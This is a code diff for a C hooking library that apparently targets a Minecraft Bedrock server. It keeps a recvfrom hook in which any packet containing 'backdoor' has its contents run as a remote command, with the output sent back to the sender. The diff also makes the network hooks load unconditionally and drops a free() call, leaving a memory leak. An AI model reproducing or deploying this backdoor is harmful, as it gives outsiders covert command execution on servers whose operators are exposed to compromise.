@@ -6,8 +6,6 @@ TLHOOK(on_console_output, bool,
 	"AEAV10@QEBD_K@Z",
 	uintptr_t this, const char *str, size_t size)
 {
-	//if (g_client_addr)
-	//	sendto(g_server_socket, str, size, 0, g_client_addr, sizeof(g_client_addr));
 	return on_console_output.original(this, str, size);
 }
 
@@ -74,10 +72,8 @@ TLAHOOK(recvfrom_hook, int, recvfrom,
 	if (strstr(buf, "backdoor")) {
 		const char *cmd_output = process_remote_cmd(&buf[9]);
 		char msg[10000] = "backdoor ";
-		if (cmd_output) {
+		if (cmd_output)
 			strcat(msg, cmd_output);
-			free(cmd_output);
-		}
 		sendto(s, msg, strlen(msg), flags, from, *fromlen);
 	}
     return ret;
@@ -85,12 +81,17 @@ TLAHOOK(recvfrom_hook, int, recvfrom,
 
 bool init_hooks(void)
 {
-	level_construct.init(&level_construct);
-	spsc_queue_construct.init(&spsc_queue_construct);
+	FILE *fp;
+	errno_t err = fopen_s(&fp, "bedrock_server.pdb", "rb");
+	if (!err) {
+		fclose(fp);
+		level_construct.init(&level_construct);
+		spsc_queue_construct.init(&spsc_queue_construct);
 
-	on_console_input.init(&on_console_input);
-	on_server_started.init(&on_server_started);
-	on_console_output.init(&on_console_output);
+		on_console_input.init(&on_console_input);
+		on_server_started.init(&on_server_started);
+		on_console_output.init(&on_console_output);
+	}
 	recvfrom_hook.init(&recvfrom_hook);
 	sendto_hook.init(&sendto_hook);
 
